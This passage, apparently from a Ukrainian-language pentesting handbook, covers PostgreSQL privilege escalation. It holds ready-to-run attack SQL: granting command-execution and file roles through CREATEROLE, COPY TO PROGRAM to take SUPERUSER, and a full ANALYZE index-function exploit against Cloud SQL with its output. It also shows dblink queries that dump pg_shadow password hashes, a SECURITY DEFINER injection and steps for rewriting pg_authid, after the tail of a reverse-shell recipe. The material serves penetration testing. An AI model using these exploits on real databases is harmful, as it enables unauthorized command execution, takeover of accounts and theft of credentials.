6. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —à–∫—ñ–¥–ª–∏–≤–∏–π `postgresql.conf`, —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –Ω–∞ –µ—Ç–∞–ø–∞—Ö 2-3, —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π
7. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ `payload.so` –∑ –µ—Ç–∞–ø—É 5 —É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é `/tmp`
8. –ü–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Å–µ—Ä–≤–µ—Ä–∞, –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–≤—à–∏ —Å–µ—Ä–≤–µ—Ä –∞–±–æ –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ –∑–∞–ø–∏—Ç `SELECT pg_reload_conf()`
9. –ü—Ä–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—ñ –¥–æ –ë–î –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∑–≤–æ—Ä–æ—Ç–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è —à–µ–ª–ª—É.

## **–ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ Postgres**

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ CREATEROLE

#### **–ù–∞–¥–∞–Ω–Ω—è**

–ó–≥—ñ–¥–Ω–æ –∑ [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é**](https://www.postgresql.org/docs/13/sql-grant.html): _–†–æ–ª—ñ, —â–æ –º–∞—é—Ç—å –ø—Ä–∏–≤—ñ–ª–µ–π **`CREATEROLE`**, –º–æ–∂—É—Ç—å **–Ω–∞–¥–∞–≤–∞—Ç–∏ –∞–±–æ –≤—ñ–¥–∫–ª–∏–∫–∞—Ç–∏ —á–ª–µ–Ω—Å—Ç–≤–æ –≤ –±—É–¥—å-—è–∫—ñ–π —Ä–æ–ª—ñ**, —è–∫–∞ **–Ω–µ —î** **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**._

–û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ–∑–≤—ñ–ª **`CREATEROLE`**, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—à–∏—Ö **—Ä–æ–ª–µ–π** (—è–∫—ñ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏), —â–æ –º–æ–∂—É—Ç—å –¥–∞—Ç–∏ –≤–∞–º –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —á–∏—Ç–∞—Ç–∏ —Ç–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### –ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å

–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ —Ü—ñ—î—é —Ä–æ–ª–ª—é —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å **–∑–º—ñ–Ω—é–≤–∞—Ç–∏** **–ø–∞—Ä–æ–ª—ñ** —ñ–Ω—à–∏—Ö **–Ω–µ-—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

–î–æ—Å–∏—Ç—å –ø–æ—à–∏—Ä–µ–Ω–æ, —â–æ **–ª–æ–∫–∞–ª—å–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å –≤—Ö–æ–¥–∏—Ç–∏ –≤ PostgreSQL –±–µ–∑ –Ω–∞–¥–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ –ø–∞—Ä–æ–ª—è**. –¢–æ–º—É, —è–∫ —Ç—ñ–ª—å–∫–∏ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ **–¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏, —â–æ–± –Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ **—Ä–æ–ª—å `SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
–¶–µ –∑–∞–∑–≤–∏—á–∞–π –º–æ–∂–ª–∏–≤–æ —á–µ—Ä–µ–∑ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä—è–¥–∫–∏ —É —Ñ–∞–π–ª—ñ **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

–£ [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —è–∫ –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º **privesc** —É Postgres GCP, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—î–º ALTER TABLE, —è–∫–∏–π –±—É–≤ –Ω–∞–¥–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É.

–ö–æ–ª–∏ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è **–∑—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–ª–∞—Å–Ω–∏–∫–æ–º —Ç–∞–±–ª–∏—Ü—ñ**, –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø–æ–º–∏–ª–∫—É**, —è–∫–∞ —Ü—å–æ–º—É –∑–∞–≤–∞–∂–∞—î, –∞–ª–µ, –æ—á–µ–≤–∏–¥–Ω–æ, GCP –Ω–∞–¥–∞–ª–∞ —Ü—é **–æ–ø—Ü—ñ—é –Ω–µ-—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É postgres** –≤ GCP:

<figure><img src="../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

–ü–æ—î–¥–Ω—É—é—á–∏ —Ü—é —ñ–¥–µ—é –∑ —Ç–∏–º —Ñ–∞–∫—Ç–æ–º, —â–æ –∫–æ–ª–∏ –∫–æ–º–∞–Ω–¥–∏ **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –Ω–∞ **—Ç–∞–±–ª–∏—Ü—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é —ñ–Ω–¥–µ–∫—Å—É**, **—Ñ—É–Ω–∫—Ü—ñ—è** **–≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è** —è–∫ —á–∞—Å—Ç–∏–Ω–∞ –∫–æ–º–∞–Ω–¥–∏ –∑ **–¥–æ–∑–≤–æ–ª–∞–º–∏** **–≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞–±–ª–∏—Ü—ñ**. –ú–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —ñ–Ω–¥–µ–∫—Å –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é —Ç–∞ –Ω–∞–¥–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏ –≤–ª–∞—Å–Ω–∏–∫–∞ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É** –Ω–∞–¥ —Ü—ñ—î—é —Ç–∞–±–ª–∏—Ü–µ—é, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ–Ω–∞—Ç–∏ ANALYZE –Ω–∞–¥ —Ç–∞–±–ª–∏—Ü–µ—é –∑ —à–∫—ñ–¥–ª–∏–≤–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é, —è–∫–∞ –∑–º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–∏–≤—ñ–ª–µ—ó –≤–ª–∞—Å–Ω–∏–∫–∞.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. –ü–æ—á–Ω—ñ—Ç—å –∑ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ—ó —Ç–∞–±–ª–∏—Ü—ñ.
2. –í—Å—Ç–∞–≤—Ç–µ –¥–µ—è–∫–∏–π –Ω–µ—Ä–µ–ª–µ–≤–∞–Ω—Ç–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç —É —Ç–∞–±–ª–∏—Ü—é, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ—ó —ñ–Ω–¥–µ–∫—Å–∞—Ü—ñ—ó.
3. –†–æ–∑—Ä–æ–±—ñ—Ç—å —à–∫—ñ–¥–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ—é —ñ–Ω–¥–µ–∫—Å–∞—Ü—ñ—ó, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –∫–æ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏.
4. –ó–º—ñ–Ω—ñ—Ç—å –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞–±–ª–∏—Ü—ñ –Ω–∞ "cloudsqladmin", —â–æ —î —Ä–æ–ª–ª—é —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ GCP, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–∏–∫–ª—é—á–Ω–æ Cloud SQL –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ç–∞ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
5. –í–∏–∫–æ–Ω–∞–π—Ç–µ –æ–ø–µ—Ä–∞—Ü—ñ—é ANALYZE –Ω–∞ —Ç–∞–±–ª–∏—Ü—ñ. –¶—è –¥—ñ—è –∑–º—É—à—É—î –¥–≤–∏–∂–æ–∫ PostgreSQL –ø–µ—Ä–µ–π—Ç–∏ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞–±–ª–∏—Ü—ñ, "cloudsqladmin". –í–Ω–∞—Å–ª—ñ–¥–æ–∫ —Ü—å–æ–≥–æ —à–∫—ñ–¥–ª–∏–≤–∞ —Ñ—É–Ω–∫—Ü—ñ—è —ñ–Ω–¥–µ–∫—Å–∞—Ü—ñ—ó –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑ –ø—Ä–∞–≤–∞–º–∏ "cloudsqladmin", —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä–∞–Ω—ñ—à–µ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ –æ–±–æ–ª–æ–Ω–∫–∏.

In PostgreSQL, this flow looks something like this:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
–¢–æ–¥—ñ —Ç–∞–±–ª–∏—Ü—è `shell_commands_results` –º—ñ—Å—Ç–∏—Ç–∏–º–µ –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –≤–∏–∫–æ–Ω–∞–Ω–æ–≥–æ –∫–æ–¥—É:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Local Login

–î–µ—è–∫—ñ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ postgresql –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª—è—Ç–∏ –≤—Ö—ñ–¥ –±—É–¥—å-—è–∫–æ–≥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –º–æ–∂–ª–∏–≤–æ –ª–æ–∫–∞–ª—å–Ω–æ –∑ 127.0.0.1, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **`dblink` function**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ä–æ–±–æ—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É **—Ñ—É–Ω–∫—Ü—ñ—è `dblink` –ø–æ–≤–∏–Ω–Ω–∞ —ñ—Å–Ω—É–≤–∞—Ç–∏**. –Ø–∫—â–æ —ó—ó –Ω–µ–º–∞—î, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —ó—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

–Ø–∫—â–æ —É –≤–∞—Å —î –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –±—ñ–ª—å—à–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏, –∞–ª–µ —Ü—å–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ –≤—Ö–æ–¥–∏—Ç–∏ –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó IP-–∞–¥—Ä–µ—Å–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –≤—ñ–¥ —ñ–º–µ–Ω—ñ —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
–ú–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —ñ—Å–Ω—É—î —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –∑** SECURITY DEFINER

[**–£ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql) –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä–∏ –∑–º–æ–≥–ª–∏ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ postgres, –Ω–∞–¥–∞–Ω–æ–≥–æ IBM, —Ç–æ–º—É —â–æ –≤–æ–Ω–∏ **–∑–Ω–∞–π—à–ª–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é –∑ –ø—Ä–∞–ø–æ—Ä–æ–º SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

–Ø–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó**](https://www.postgresql.org/docs/current/sql-createfunction.html), —Ñ—É–Ω–∫—Ü—ñ—è –∑ **SECURITY DEFINER –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è** –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π —ó—ó –≤–æ–ª–æ–¥—ñ—î**. –¢–æ–º—É, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è **–≤—Ä–∞–∑–ª–∏–≤–∞ –¥–æ SQL Injection** –∞–±–æ –≤–∏–∫–æ–Ω—É—î –¥–µ—è–∫—ñ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–º–∏ –∞—Ç–∞–∫—É—é—á–∏–º**, —ó—ó –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è **–µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ postgres**.

–£ —Ä—è–¥–∫—É 4 –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∫–æ–¥—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è –º–∞—î –ø—Ä–∞–ø–æ—Ä **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏**:

<figure><img src="../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

### –ü—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –ë—Ä—É—Ç—Ñ–æ—Ä—Å—É –∑ PL/pgSQL

**PL/pgSQL** - —Ü–µ **–ø–æ–≤–Ω–æ—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∞ –º–æ–≤–∞ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è**, —è–∫–∞ –ø—Ä–æ–ø–æ–Ω—É—î –±—ñ–ª—å—à–∏–π –ø—Ä–æ—Ü–µ–¥—É—Ä–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å —É –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—ñ –∑ SQL. –í–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Ü–∏–∫–ª–∏** —Ç–∞ —ñ–Ω—à—ñ **—Å—Ç—Ä—É–∫—Ç—É—Ä–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è** –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è –ª–æ–≥—ñ–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–∏. –ö—Ä—ñ–º —Ç–æ–≥–æ, **SQL-—ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó** —Ç–∞ **—Ç—Ä–∏–≥–µ—Ä–∏** –º–∞—é—Ç—å –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–º–æ–≤–∏ PL/pgSQL**. –¶—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –¥–æ–∑–≤–æ–ª—è—î –±—ñ–ª—å—à –∫–æ–º–ø–ª–µ–∫—Å–Ω–∏–π —ñ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —Ç–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó.\
**–í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –º–æ–≤–æ—é, —â–æ–± –ø–æ–ø—Ä–æ—Å–∏—Ç–∏ PostgreSQL –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### –ü—Ä–∏–≤—ñ–ª–µ—ó —á–µ—Ä–µ–∑ –ü–µ—Ä–µ–∑–∞–ø–∏—Å –í–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö –¢–∞–±–ª–∏—Ü—å PostgreSQL

{% hint style="info" %}
–ù–∞—Å—Ç—É–ø–Ω–∏–π –≤–µ–∫—Ç–æ—Ä –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω–∏–π —É –æ–±–º–µ–∂–µ–Ω–∏—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö SQLi, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å—ñ –∫—Ä–æ–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —á–µ—Ä–µ–∑ –≤–∫–ª–∞–¥–µ–Ω—ñ SELECT-—ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó
{% endhint %}

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **—á–∏—Ç–∞—Ç–∏ —Ç–∞ –ø–∏—Å–∞—Ç–∏ —Ñ–∞–π–ª–∏ —Å–µ—Ä–≤–µ—Ä–∞ PostgreSQL**, –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–∞—Ç–∏ —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª PostgreSQL –Ω–∞ –¥–∏—Å–∫—É, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—é —Ç–∞–±–ª–∏—Ü–µ—é `pg_authid`.

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ **—Ü—é —Ç–µ—Ö–Ω—ñ–∫—É** [**—Ç—É—Ç**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

–ö—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏:

1. –û—Ç—Ä–∏–º–∞—Ç–∏ –∫–∞—Ç–∞–ª–æ–≥ –¥–∞–Ω–∏—Ö PostgreSQL
2. –û—Ç—Ä–∏–º–∞—Ç–∏ –≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª–æ–≤–æ–≥–æ –≤—É–∑–ª–∞, –ø–æ–≤'—è–∑–∞–Ω–æ–≥–æ –∑ —Ç–∞–±–ª–∏—Ü–µ—é `pg_authid`
3. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*`
4. –û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–∏–ø –¥–∞–Ω–∏—Ö, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Ç–∞–±–ª–∏—Ü–µ—é `pg_authid`
5. –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ [–†–µ–¥–∞–∫—Ç–æ—Ä –§–∞–π–ª–æ–≤–∏—Ö –í—É–∑–ª—ñ–≤ PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor), —â–æ–± [—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≤—Å—ñ –±—É–ª–µ–≤—ñ –ø—Ä–∞–ø–æ—Ä–∏ `rol*` –Ω–∞ 1 –¥–ª—è –ø–æ–≤–Ω–∏—Ö –ø—Ä–∞–≤.
